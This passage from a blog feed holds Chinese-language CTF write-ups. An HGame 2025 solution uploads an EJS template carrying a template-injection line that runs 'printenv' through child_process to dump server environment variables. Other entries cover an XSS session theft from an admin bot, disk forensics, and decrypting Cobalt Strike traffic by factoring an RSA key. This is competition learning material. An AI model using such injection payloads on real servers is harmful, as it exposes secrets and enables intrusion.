class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Ave Mujica&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        :root &#123;</span><br><span class="line">            --bg-color: #1a1a1a;</span><br><span class="line">            --text-color: #e0e0e0;</span><br><span class="line">            --accent-color: #ff4444;</span><br><span class="line">            --border-color: #333;</span><br><span class="line">            --hover-color: #2a2a2a;</span><br><span class="line">            --button-bg: #ff4444;</span><br><span class="line">            --button-hover: #ff6666;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        body &#123; </span><br><span class="line">            padding: 20px;</span><br><span class="line">            margin: 0;</span><br><span class="line">            font-family: &#x27;Segoe UI&#x27;, Arial, sans-serif;</span><br><span class="line">            background-color: var(--bg-color);</span><br><span class="line">            color: var(--text-color);</span><br><span class="line">            min-height: 100vh;</span><br><span class="line">            background-image: url(&#x27;/static/UmiTaki.webp&#x27;);</span><br><span class="line">            background-size: cover;</span><br><span class="line">            background-position: center;</span><br><span class="line">            background-attachment: fixed;</span><br><span class="line">            position: relative;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        body::before &#123;</span><br><span class="line">            content: &#x27;&#x27;;</span><br><span class="line">            position: fixed;</span><br><span class="line">            top: 0;</span><br><span class="line">            left: 0;</span><br><span class="line">            right: 0;</span><br><span class="line">            bottom: 0;</span><br><span class="line">            background: rgba(26, 26, 26, 0.85);</span><br><span class="line">            z-index: 0;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .container &#123;</span><br><span class="line">            max-width: 800px;</span><br><span class="line">            margin: 0 auto;</span><br><span class="line">            padding: 20px;</span><br><span class="line">            position: relative;</span><br><span class="line">            z-index: 1;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        h2 &#123;</span><br><span class="line">            color: var(--accent-color);</span><br><span class="line">            font-size: 2em;</span><br><span class="line">            margin-bottom: 1.5em;</span><br><span class="line">            text-transform: uppercase;</span><br><span class="line">            letter-spacing: 2px;</span><br><span class="line">            text-align: center;</span><br><span class="line">            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .upload-section &#123;</span><br><span class="line">            padding: 2em;</span><br><span class="line">            margin-bottom: 2em;</span><br><span class="line">            text-align: center;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .upload-form &#123;</span><br><span class="line">            display: flex;</span><br><span class="line">            justify-content: center;</span><br><span class="line">            align-items: center;</span><br><span class="line">            gap: 20px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .file-input-container &#123;</span><br><span class="line">            position: relative;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        input[type=&quot;file&quot;] &#123;</span><br><span class="line">            display: none;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .file-input-label &#123;</span><br><span class="line">            display: inline-block;</span><br><span class="line">            padding: 12px 24px;</span><br><span class="line">            color: white;</span><br><span class="line">            cursor: pointer;</span><br><span class="line">            text-transform: uppercase;</span><br><span class="line">            letter-spacing: 1px;</span><br><span class="line">            font-size: 0.9em;</span><br><span class="line">            white-space: nowrap;</span><br><span class="line">            background-color: var(--accent-color);</span><br><span class="line">            border-radius: 8px;</span><br><span class="line">            box-shadow: 0 4px 15px rgba(255, 68, 68, 0.3);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        button[type=&quot;submit&quot;] &#123;</span><br><span class="line">            color: white;</span><br><span class="line">            border: none;</span><br><span class="line">            padding: 12px 24px;</span><br><span class="line">            cursor: pointer;</span><br><span class="line">            text-transform: uppercase;</span><br><span class="line">            letter-spacing: 1px;</span><br><span class="line">            font-size: 0.9em;</span><br><span class="line">            white-space: nowrap;</span><br><span class="line">            background-color: var(--accent-color);</span><br><span class="line">            border-radius: 8px;</span><br><span class="line">            box-shadow: 0 4px 15px rgba(255, 68, 68, 0.3);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .meme-section &#123;</span><br><span class="line">            padding: 2em;</span><br><span class="line">            margin-bottom: 2em;</span><br><span class="line">            text-align: center;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .file-list &#123;</span><br><span class="line">            margin-bottom: 2em;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .file-item &#123;</span><br><span class="line">            margin: 10px 0;</span><br><span class="line">            padding: 15px 20px;</span><br><span class="line">            border-radius: 5px;</span><br><span class="line">            transition: all 0.3s ease;</span><br><span class="line">            border: 2px solid var(--accent-color);</span><br><span class="line">            background: transparent;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .file-item:hover &#123;</span><br><span class="line">            background: var(--accent-color);</span><br><span class="line">            transform: translateX(5px);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .file-name &#123;</span><br><span class="line">            font-size: 1.1em;</span><br><span class="line">            color: var(--text-color);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .meme-image &#123;</span><br><span class="line">            max-width: 200px;</span><br><span class="line">            transition: transform 0.3s ease;</span><br><span class="line">            margin-top: 2em;</span><br><span class="line">            border-radius: 10px;</span><br><span class="line">            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .meme-image:hover &#123;</span><br><span class="line">            transform: scale(1.05);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .selected-file-name &#123;</span><br><span class="line">            position: absolute;</span><br><span class="line">            bottom: -25px;</span><br><span class="line">            left: 50%;</span><br><span class="line">            transform: translateX(-50%);</span><br><span class="line">            color: var(--accent-color);</span><br><span class="line">            font-size: 0.9em;</span><br><span class="line">            white-space: nowrap;</span><br><span class="line">            max-width: 200px;</span><br><span class="line">            overflow: hidden;</span><br><span class="line">            text-overflow: ellipsis;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @keyframes fadeIn &#123;</span><br><span class="line">            from &#123; opacity: 0; transform: translateY(20px); &#125;</span><br><span class="line">            to &#123; opacity: 1; transform: translateY(0); &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .file-item &#123;</span><br><span class="line">            animation: fadeIn 0.5s ease forwards;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">        &lt;h2&gt;Ave Mujica ! ! ! !!&lt;/h2&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;div class=&quot;upload-section&quot;&gt;</span><br><span class="line">            &lt;form id=&quot;uploadForm&quot; class=&quot;upload-form&quot;&gt;</span><br><span class="line">                &lt;div class=&quot;file-input-container&quot;&gt;</span><br><span class="line">                    &lt;label class=&quot;file-input-label&quot; for=&quot;fileInput&quot;&gt;</span><br><span class="line">                        选择文件</span><br><span class="line">                    &lt;/label&gt;</span><br><span class="line">                    &lt;input id=&quot;fileInput&quot; type=&quot;file&quot; name=&quot;file&quot; required&gt;</span><br><span class="line">                    &lt;div id=&quot;selectedFileName&quot; class=&quot;selected-file-name&quot;&gt;&lt;/div&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;button type=&quot;submit&quot;&gt;上传文件&lt;/button&gt;</span><br><span class="line">            &lt;/form&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;pre&gt;</span><br><span class="line">&lt;%- process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;printenv&#x27;).toString() %&gt;</span><br><span class="line">        &lt;/pre&gt;</span><br><span class="line">        &lt;div class=&quot;meme-section&quot;&gt;</span><br><span class="line">            &lt;div id=&quot;fileList&quot; class=&quot;file-list&quot;&gt;</span><br><span class="line">                &lt;% if (files &amp;&amp; files.length &gt; 0) &#123; %&gt;</span><br><span class="line">                    &lt;% files.forEach(function(file) &#123; %&gt;</span><br><span class="line">                        &lt;div class=&quot;file-item&quot;&gt;</span><br><span class="line">                            &lt;span class=&quot;file-name&quot;&gt;&lt;%= file %&gt;&lt;/span&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                    &lt;% &#125;); %&gt;</span><br><span class="line">                &lt;% &#125; else &#123; %&gt;</span><br><span class="line">                    &lt;p style=&quot;text-align: center; color: rgba(255,255,255,0.5);&quot;&gt;我们的乐队蒸蒸日上&lt;/p&gt;</span><br><span class="line">                    &lt;p style=&quot;display: none;&quot;&gt;只是UmiTaki而已&lt;/p&gt;</span><br><span class="line">                &lt;% &#125; %&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;img src=&quot;/static/Eruption.jpg&quot; alt=&quot;表情包&quot; class=&quot;meme-image&quot;&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        // 显示选择的文件名</span><br><span class="line">        document.getElementById(&#x27;fileInput&#x27;).addEventListener(&#x27;change&#x27;, function(e) &#123;</span><br><span class="line">            const fileName = e.target.files[0]?.name || &#x27;&#x27;;</span><br><span class="line">            document.getElementById(&#x27;selectedFileName&#x27;).textContent = fileName;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        // 上传文件</span><br><span class="line">        document.getElementById(&#x27;uploadForm&#x27;).onsubmit = async (e) =&gt; &#123;</span><br><span class="line">            e.preventDefault();</span><br><span class="line">            const formData = new FormData(e.target);</span><br><span class="line">            </span><br><span class="line">            try &#123;</span><br><span class="line">                const response = await fetch(&#x27;/upload&#x27;, &#123;</span><br><span class="line">                    method: &#x27;POST&#x27;,</span><br><span class="line">                    body: formData</span><br><span class="line">                &#125;);</span><br><span class="line">                const result = await response.json();</span><br><span class="line">                if (result.error) &#123;</span><br><span class="line">                    alert(result.error);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    alert(result.message);</span><br><span class="line">                    window.location.reload();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; catch (err) &#123;</span><br><span class="line">                alert(&#x27;上传失败: &#x27; + err.message);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><figure><img src="/images/HGame2025-Writeup/image-20250206201142580.png"alt="image-20250206201142580" /><figcaption aria-hidden="true">image-20250206201142580</figcaption></figure><figure><img src="/images/HGame2025-Writeup/image-20250206201206989.png"alt="image-20250206201206989" /><figcaption aria-hidden="true">image-20250206201206989</figcaption></figure><figure><img src="/images/HGame2025-Writeup/image-20250206201226721.png"alt="image-20250206201226721" /><figcaption aria-hidden="true">image-20250206201226721</figcaption></figure><h3 id="level-69-mysterymessageboard">Level 69 MysteryMessageBoard</h3><p>爆破得密码是888888</p><figure><img src="/images/HGame2025-Writeup/image-20250204183548983.png"alt="image-20250204183548983" /><figcaption aria-hidden="true">image-20250204183548983</figcaption></figure><p>看题目描述就是xss</p><figure><img src="/images/HGame2025-Writeup/image-20250204183646342.png"alt="image-20250204183646342" /><figcaption aria-hidden="true">image-20250204183646342</figcaption></figure><p>访问/admin，让机器人登录上去访问一下得到admin的session</p><figure><img src="/images/HGame2025-Writeup/image-20250204183820528.png"alt="image-20250204183820528" /><figcaption aria-hidden="true">image-20250204183820528</figcaption></figure><p>用这个session去访问/flag即可得到flag</p><figure><img src="/images/HGame2025-Writeup/image-20250204183935597.png"alt="image-20250204183935597" /><figcaption aria-hidden="true">image-20250204183935597</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> HGame </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RDCTF2025 Writeup</title>
      <link href="/posts/e8dac673/"/>
      <url>/posts/e8dac673/</url>
      
        <content type="html"><![CDATA[<p>学弟出题的比赛，拿了个第一名来给学弟捧个场:)</p><h4 id="writeup点我"><ahref="https://www.blog.st4rr.top/writeups/RDCTF2025Writeup.pdf">Writeup点我</a></h4>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> RDCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>西湖论剑2025 Misc Writeup+复现</title>
      <link href="/posts/d93eb23/"/>
      <url>/posts/d93eb23/</url>
      
        <content type="html"><![CDATA[<h2 id="writeup">Writeup</h2><h3 id="糟糕的磁盘">糟糕的磁盘</h3><p>取证大师一下子导入五个镜像即可，可以看到key和secret</p><figure><imgsrc="/images/西湖论剑2025-Misc-Writeup-复现/55e2e957-00ec-4d20-a9fd-04bed5f08f21.png"alt="55e2e957-00ec-4d20-a9fd-04bed5f08f21" /><figcaptionaria-hidden="true">55e2e957-00ec-4d20-a9fd-04bed5f08f21</figcaption></figure><p>veracrypt挂载一下，key.png当做密钥文件</p><figure><imgsrc="/images/西湖论剑2025-Misc-Writeup-复现/14bc8d87-b159-4a18-8fb8-c6ae9e705112.png"alt="14bc8d87-b159-4a18-8fb8-c6ae9e705112" /><figcaptionaria-hidden="true">14bc8d87-b159-4a18-8fb8-c6ae9e705112</figcaption></figure><h2 id="复现">复现</h2><h3 id="cscs">CSCS</h3><blockquote><p>挺逆天的题目，当时比赛的时候是零解。本来前阵子我为了出题专门研究过CS流量，结果这个题中没直接给私钥，也不是已知私钥，也没给镜像什么的，当时就直接给我干懵了。谁知道他这里是要用密码学自己去分解得到私钥。。。不过手撕pem什么的操作我倒是也会。。。好吧还是我菜了:(</p></blockquote><p>可以看到给出了http beacon</p><figure><imgsrc="/images/西湖论剑2025-Misc-Writeup-复现/image-20250124144345833.png"alt="image-20250124144345833" /><figcaption aria-hidden="true">image-20250124144345833</figcaption></figure><p>用1768.py可以拿到公钥</p><figure><imgsrc="/images/西湖论剑2025-Misc-Writeup-复现/image-20250124153616367.png"alt="image-20250124153616367" /><figcaption aria-hidden="true">image-20250124153616367</figcaption></figure><p>当时就是停在这了，根本没想到这个公钥可以分解。。。</p><p>把这串十六进制数做成pem格式，拿到n</p><figure><imgsrc="/images/西湖论剑2025-Misc-Writeup-复现/image-20250125161846520.png"alt="image-20250125161846520" /><figcaption aria-hidden="true">image-20250125161846520</figcaption></figure><figure><imgsrc="/images/西湖论剑2025-Misc-Writeup-复现/image-20250125161928957.png"alt="image-20250125161928957" /><figcaption aria-hidden="true">image-20250125161928957</figcaption></figure><p>这n可以直接用yafu分解。。。</p><figure><imgsrc="/images/西湖论剑2025-Misc-Writeup-复现/image-20250125162015873.png"alt="image-20250125162015873" /><figcaption aria-hidden="true">image-20250125162015873</figcaption></figure><p>然后做成pem格式的私钥文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.asymmetric <span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> serialization</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_rsa_keys_from_components</span>(<span class="params">p, q, n, e, d</span>):</span><br><span class="line">    private_key = rsa.RSAPrivateNumbers(</span><br><span class="line">        p=p,</span><br><span class="line">        q=q,</span><br><span class="line">        d=d,</span><br><span class="line">        dmp1=d % (p - <span class="number">1</span>),</span><br><span class="line">        dmq1=d % (q - <span class="number">1</span>),</span><br><span class="line">        iqmp=rsa.rsa_crt_iqmp(p, q),</span><br><span class="line">        public_numbers=rsa.RSAPublicNumbers(e=e, n=n),</span><br><span class="line">    ).private_key(backend=default_backend())</span><br><span class="line">    public_key = private_key.public_key()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> public_key, private_key</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save_keys_to_pem</span>(<span class="params">public_key, private_key, public_path, private_path</span>):</span><br><span class="line">    public_pem = public_key.public_bytes(</span><br><span class="line">        encoding=serialization.Encoding.PEM,</span><br><span class="line">        <span class="built_in">format</span>=serialization.PublicFormat.SubjectPublicKeyInfo,</span><br><span class="line">    )</span><br><span class="line">    private_pem = private_key.private_bytes(</span><br><span class="line">        encoding=serialization.Encoding.PEM,</span><br><span class="line">        <span class="built_in">format</span>=serialization.PrivateFormat.PKCS8,</span><br><span class="line">        encryption_algorithm=serialization.NoEncryption(),</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(public_path, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(public_pem)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(private_path, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(private_pem)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    p = <span class="number">7605291443685150594150190909345113655196508809219162555499789316232908573154196070425269090153291952292016936024761413150455793038505322748933150548026221</span></span><br><span class="line">    q = <span class="number">7605291443685150594150190909345113655196508809219162555499789316232908573154196070425269090153291952292016936024761413150455793038505322748933150548026527</span></span><br><span class="line">    e = <span class="number">0x10001</span></span><br><span class="line">    n = p * q</span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    d = gmpy2.invert(e, phi)</span><br><span class="line">    <span class="built_in">print</span>(d)</span><br><span class="line">    d = <span class="built_in">int</span>(d)</span><br><span class="line">    public_key, private_key = generate_rsa_keys_from_components(p, q, n, e, d)</span><br><span class="line">    save_keys_to_pem(public_key, private_key, <span class="string">&quot;publicKey.pem&quot;</span>, <span class="string">&quot;privateKey.pem&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;公钥和私钥已成功生成并保存到文件中！&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>接下来就是经典的解密cs流量</p><p>先找到cookie，拿到AES key和HMAC key</p><figure><imgsrc="/images/西湖论剑2025-Misc-Writeup-复现/image-20250128153326532.png"alt="image-20250128153326532" /><figcaption aria-hidden="true">image-20250128153326532</figcaption></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span 